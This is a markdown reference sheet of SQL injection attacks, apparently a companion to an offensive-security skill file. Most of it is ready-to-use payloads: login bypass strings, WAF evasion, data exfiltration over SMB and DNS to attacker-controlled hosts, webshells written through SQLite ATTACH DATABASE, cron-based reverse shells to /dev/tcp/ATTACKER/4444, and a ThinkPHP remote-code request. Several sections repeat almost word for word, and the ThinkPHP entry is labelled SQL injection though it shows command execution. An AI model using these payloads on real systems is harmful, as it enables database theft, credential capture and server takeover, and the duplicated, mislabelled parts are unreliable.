# SQL Injection — Extended Scenarios & Real-World Cases

> Companion to [SKILL.md](./SKILL.md). Contains additional attack scenarios, CVE case studies, and injection techniques from real-world engagements.

---

## 1. SMB Out-of-Band Exfiltration (MySQL on Windows)

When the MySQL server runs on Windows with outbound SMB allowed:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\share'));
-- Triggers SMB connection → DNS lookup with data in hostname

-- More complete:
SELECT LOAD_FILE(CONCAT('\\\\attacker-ip\\', user(), '\\l.txt'));
-- SMB authentication attempt → attacker captures NTLMv2 hash via Responder
```

**Compared to DNS exfiltration**: SMB exfil can also leak NTLM hashes, enabling offline password cracking. DNS exfil is more reliable across firewalls.

---

## 2. KEY Injection / URI Injection

Beyond GET/POST parameters, SQL injection may occur in less-tested locations:

| Injection Point | Example |
|---|---|
| JSON key names | `{"admin' OR 1=1--": "value"}` — if key is used in column name |
| URI path segments | `/api/users/1 OR 1=1` — if path param enters SQL |
| HTTP headers | `X-Forwarded-For: 127.0.0.1' OR 1=1--` |
| Cookie values | `session=abc' UNION SELECT...` |
| Multipart filename | `filename="test' OR '1'='1.jpg"` |
| ORDER BY from API sort param | `?sort=name;SELECT SLEEP(5)--` |

---

## 3. INSERT / DELETE / UPDATE Injection Differences

Most SQLi training focuses on SELECT. Real applications use INSERT/UPDATE/DELETE with different exploitation strategies:

### INSERT Statement Injection

```sql
-- Original: INSERT INTO logs (user, action) VALUES ('INPUT', 'login');
-- Injection in user field:
INPUT: admin', 'login'), ('attacker', (SELECT password FROM users LIMIT 1))--
-- Result: INSERT INTO logs (user, action) VALUES ('admin', 'login'), ('attacker', 'actual_password')--', 'login');
-- Exfiltrates data into a visible log table
```

### UPDATE Statement Injection

```sql
-- Original: UPDATE users SET email='INPUT' WHERE id=5;
-- Injection: '), admin=1 WHERE username='victim'--
-- Result: UPDATE users SET email=''), admin=1 WHERE username='victim'--' WHERE id=5;
-- Escalates victim's privileges
```

### DELETE Statement Injection

```sql
-- Application's own statement (the injectable sink): DELETE FROM cart WHERE item_id='INPUT' AND user_id=5;
-- Non-destructive proof: confirm injection with a time-based payload, not by widening the WHERE:
-- Injection: 1' AND IF((SELECT 1),SLEEP(5),0)-- 
-- Note: a boolean payload (e.g. 1' OR '1'='1) would match every row (DoS / data destruction) — do not run it against real data.
```

---

## 4. CVE Case: ThinkPHP5 SQL Injection

ThinkPHP5 framework's `where` method improperly handles array parameters:

```
POST /index/think\app/invokefunction
Content-Type: application/x-www-form-urlencoded

function=call_user_func_array&vars[0]=system&vars[1][]=id
```

Error-based extraction using `updatexml`:
```sql
id=1' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)--
```

---

## 5. CVE Case: Django GIS SQL Injection (CVE-2020-9402)

Django's GIS `GeoQuerySet` methods (e.g., `annotate` with `RawSQL`) on Oracle backend allow error-based injection via `utl_inaddr.get_host_name`:

```sql
-- Oracle error-based exfiltration:
' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--
-- Oracle raises ORA-29257 containing the username in the error message

-- DNS-based out-of-band on Oracle:
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
```

**Takeaway**: Oracle-specific functions (`utl_inaddr`, `utl_http`, `dbms_ldap`) are powerful OOB channels that bypass most firewall restrictions.

---

## 6. SQL Injection via Different SQL Verbs

Applications may use different HTTP methods and SQL verbs for the same endpoint:

```text
GET  /api/items?id=1      → SELECT (read)
POST /api/items            → INSERT (create)
PUT  /api/items/1          → UPDATE (modify)
DELETE /api/items/1        → DELETE (remove)

Each verb constructs a different SQL statement.
Test ALL verbs, not just the one shown in the UI.
```

---

## 7. Universal Password Bypass Patterns

```sql
-- Standard:
admin'--
admin' OR 1=1--
' OR '1'='1

-- With parentheses (common in PHP apps):
') OR ('1'='1
') OR 1=1--

-- With comment variations:
admin'/*
admin' OR 1=1#

-- Without quotes (numeric context):
1 OR 1=1
0 OR 1=1
```

---

## 8. DB2 Injection Specifics

DB2 uses distinct syntax and system tables.

### Enumeration
```sql
SELECT versionnumber, version_timestamp FROM sysibm.sysversions
SELECT schemaname FROM syscat.schemata
SELECT inst_name FROM sysibmadm.env_inst_info
SELECT 1 FROM sysibm.sysdummy1   -- equivalent to Oracle DUAL
```

### Blind Injection
```sql
-- Character extraction:
AND ascii(substr((SELECT user FROM sysibm.sysdummy1),1,1)) > 64

-- Row selection (no LIMIT):
SELECT column FROM table FETCH FIRST 1 ROWS ONLY

-- Time-based via Cartesian product (no SLEEP):
AND 1=(SELECT COUNT(*) FROM sysibm.sysdummy1 a, sysibm.sysdummy1 b, sysibm.sysdummy1 c)
```

### Command Execution
```sql
-- IBM i (AS/400) only:
CALL QSYS2.QCMDEXC('COMMAND_HERE')
```

### WAF Bypass
```sql
-- Avoid quotes via chr() concatenation:
chr(65)||chr(68)||chr(77)||chr(73)||chr(78)   -- 'ADMIN'
```

---

## 9. Cassandra Injection Specifics (CQL)

Cassandra Query Language has severe limitations for injection:

### Key Limitations
- No JOIN, no UNION, no subqueries
- No `OR` operator in WHERE clause
- No `SLEEP()` or time-delay function
- No built-in `USER()` function

### Authentication Bypass
```sql
-- Null byte termination:
admin' ALLOW FILTERING; %00

-- Multi-line comment closure:
admin'/*    (in username)
*/and pass>'  (in password)
```

### Comments
```sql
/* multi-line comment */
-- No single-line comment syntax
```

---

## 10. BigQuery Injection Specifics

Google BigQuery uses backtick-quoted identifiers and lacks traditional blind techniques.

### Identification
```sql
-- Backtick syntax is distinctive:
SELECT * FROM `project.dataset.table`

-- System variables:
SELECT @@project_id
```

### Enumeration
```sql
SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA
-- Fully qualified table names required: project.dataset.table
```

### Error-based
```sql
-- Division by zero:
' OR if(1/(length((select('a')))-1)=1,true,false) OR '
```

### Boolean Blind
```sql
' AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1),1,1)='A' --
```

### Key Notes
- No native `SLEEP()` function for time-based blind
- Comments: `#`, `/* */`
- No stacked queries support

---

## 11. SQLite Injection to RCE

SQLite supports file operations that can escalate to code execution.

### Enumeration
```sql
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='target_table'
SELECT * FROM pragma_table_info('target_table')
```

### Write Webshell via ATTACH DATABASE
```sql
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.cmd (payload text);
INSERT INTO pwn.cmd VALUES ('<?php system($_GET["c"]); ?>');
```

### Write Cron Job
```sql
ATTACH DATABASE '/var/spool/cron/crontabs/www-data' AS cron;
CREATE TABLE cron.job (payload text);
INSERT INTO cron.job VALUES ('* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"');
```

### load_extension (if enabled)
```sql
-- Load shared library for RCE (rarely enabled):
SELECT load_extension('/tmp/evil.so')
-- Windows UNC path variant:
SELECT load_extension('\\attacker\share\evil.dll')
```

### writefile (if available)
```sql
SELECT writefile('/var/www/html/shell.php', '<?php system($_GET["c"]); ?>');
```

### Error-based
```sql
-- Trigger error via nonexistent function:
CASE WHEN [condition] THEN 1 ELSE load_extension(1) END
```

### Time-based (no SLEEP)
```sql
-- CPU-intensive operation as delay:
AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2))))
```

---

## 12. WAF Bypass Matrix

### No Spaces Allowed
```sql
/**/UNION/**/SELECT/**/1,2,3
UNION%09SELECT%091,2,3     -- tab character
UNION%0BSELECT%0B1,2,3    -- vertical tab
UNION(SELECT(1),(2),(3))   -- parentheses instead of spaces
```

### No Commas Allowed
```sql
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
-- CASE/JOIN substitution
SELECT CASE WHEN 1=1 THEN 1 END FROM dual
-- OFFSET instead of comma in LIMIT:
LIMIT 1 OFFSET 0
```

### Polyglot Injection
```sql
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Routed Injection
```sql
-- Nested query where inner result becomes part of outer:
1' UNION SELECT 0x2720554e494f4e2053454c454354 -- (hex-encoded second stage)
```

### Second Order Injection
```
Step 1: Register username: admin'--
Step 2: Login as admin'-- (stored in session)
Step 3: Change password → UPDATE users SET password='new' WHERE user='admin'--'
        Effectively changes admin's password
```

---

## 13. CTF-Oriented Techniques

### handler (bypass SELECT filter)
```sql
-- When SELECT is blocked:
handler `table_name` open as a;
handler `a` read next;
handler `a` close;
```

### prepare + hex (bypass keyword filters)
```sql
SET @a=0x73656c65637420757365722829;  -- hex of "select user()"
PREPARE execsql FROM @a;
EXECUTE execsql;
```

### innodb_table_stats (bypass information_schema filter)
```sql
-- When 'information_schema' or 'or' is filtered:
SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=database()
```

### No-column-name Injection
```sql
-- When column names are unknown:
SELECT `3` FROM (SELECT 1,2,3 UNION SELECT * FROM target_table)a LIMIT 1,1
-- Backtick number refers to positional column
```

### Double-write Bypass
```sql
-- When keywords are removed once:
uunionnion sselectelect 1,2,3 ffromrom target
-- After removal: union select 1,2,3 from target
```

### group_concat Alternative
```sql
-- When group_concat is filtered, use GROUP BY with error:
SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x
```

---

## 14. DB2 Injection Specifics

DB2 uses different system catalogs and has unique capabilities:

```sql
-- Version detection
SELECT versionnumber, version_timestamp FROM sysibm.sysversions

-- Current user
SELECT user FROM sysibm.sysdummy1

-- Schema enumeration
SELECT schemaname FROM syscat.schemata
SELECT name, tbname FROM sysibm.syscolumns WHERE tbname='USERS'

-- Blind injection
SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END FROM sysibm.sysdummy1
-- Character extraction:
SELECT ascii(substr(user,1,1)) FROM sysibm.sysdummy1

-- Time-based (Cartesian product amplification)
SELECT count(*) FROM sysibm.columns t1, sysibm.columns t2, sysibm.columns t3

-- Command execution (IBM i / AS/400)
CALL QSYS2.QCMDEXC('COMMAND_STRING')

-- WAF bypass: concatenate without quotes
chr(65)||chr(68)||chr(77)||chr(73)||chr(78)
```

---

## 15. Cassandra (CQL) Injection Specifics

Cassandra Query Language has severe limitations compared to SQL:

```
-- Key differences from SQL:
-- * No JOIN, no UNION, no subqueries
-- * No OR operator in WHERE clause
-- * No SLEEP() or time-delay functions
-- * No built-in USER() function
-- * Comments: /* ... */ only

-- Login bypass:
username: admin' ALLOW FILTERING; %00
-- Multi-line comment bypass:
username: admin'/*
password: */and pass>'

-- Boolean extraction via IF() in CQL:
SELECT * FROM users WHERE user='admin' IF EXISTS
```

---

## 16. BigQuery Injection Specifics

Google BigQuery uses backticks and has unique syntax:

```sql
-- Identification: backtick syntax for identifiers
SELECT * FROM `project.dataset.table`

-- System information
SELECT @@project_id

-- Schema enumeration
SELECT * FROM `project.dataset.INFORMATION_SCHEMA.SCHEMATA`
-- Fully qualified: project.dataset.INFORMATION_SCHEMA.TABLES

-- Comments: # and /* */

-- Error-based (division by zero):
' OR if(1/(length((select('a')))-1)=1,true,false) OR '

-- Boolean-based
' AND SUBSTRING((SELECT column FROM dataset.table LIMIT 1),1,1)='A

-- IMPORTANT: No native SLEEP() function
-- No time-based blind injection possible with standard functions

-- UNION template:
' UNION ALL SELECT (SELECT @@project_id),2,3--
```

---

## 17. SQLite Injection to RCE

SQLite has powerful file system interaction capabilities:

```sql
-- Enumeration
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='users'
SELECT * FROM pragma_table_info('users')

-- Blind injection
SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END
-- Hex-based character extraction:
SELECT hex(substr(password,1,1)) FROM users LIMIT 1

-- Error-based
SELECT CASE WHEN [BOOLEAN] THEN 1 ELSE load_extension(1) END

-- Time-based (heavy computation)
SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))

-- RCE via ATTACH DATABASE (write webshell)
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.exp (payload TEXT);
INSERT INTO pwn.exp VALUES ('<?php system($_GET["c"]); ?>');

-- RCE via ATTACH DATABASE (write crontab)
ATTACH DATABASE '/var/spool/cron/crontabs/www-data' AS pwn;
CREATE TABLE pwn.exp (payload TEXT);
INSERT INTO pwn.exp VALUES ('* * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1');

-- RCE via load_extension
-- Compile shared library with init function, then:
SELECT load_extension('/tmp/evil.so','init_func');
-- Windows UNC: SELECT load_extension('\\attacker\share\evil.dll');

-- Write file (if enabled)
SELECT writefile('/var/www/html/shell.php', '<?php system($_GET["c"]); ?>');
```

---

## 18. CTF SQL Injection Techniques

### handler Bypass (when SELECT is filtered)
```sql
-- MySQL-specific alternative to SELECT:
handler `tablename` open as a;
handler `a` read next;
handler `a` close;
```

### prepare + hex (when keywords are filtered)
```sql
SET @a=0x73656C65637420757365722C70617373776F72642066726F6D207573657273;
-- hex of: select user,password from users
prepare execsql from @a;
execute execsql;
```

### innodb_table_stats (bypass information_schema filter)
```sql
-- When 'information_schema' or 'or' is filtered:
SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=database()
```

### No-column-name injection
```sql
-- When column names are unknown:
SELECT `1` FROM (SELECT 1,2,3 UNION SELECT * FROM users)a
-- Backtick numbers correspond to column positions
```

### Double-write bypass
```sql
-- When keywords are removed once:
uunionnion sselectelect ffromrom
-- After filter removes: union select from
```

### XOR blind injection
```sql
-- When most operators are filtered but ^ remains:
id=1^(ascii(substr((select(flag)from(flag)),1,1))>100)^1
```

### PIPES_AS_CONCAT mode
```sql
-- When || is not filtered:
SET sql_mode=PIPES_AS_CONCAT;
SELECT 1||flag FROM flag
-- || acts as string concatenation instead of OR
```

### Rename/Alter table trick
```sql
-- Rename flag table to match app's expected query:
ALTER TABLE flag RENAME TO words;
ALTER TABLE words ADD COLUMN id INT DEFAULT 1;
-- App query: SELECT * FROM words WHERE id=1 → returns flag data
```
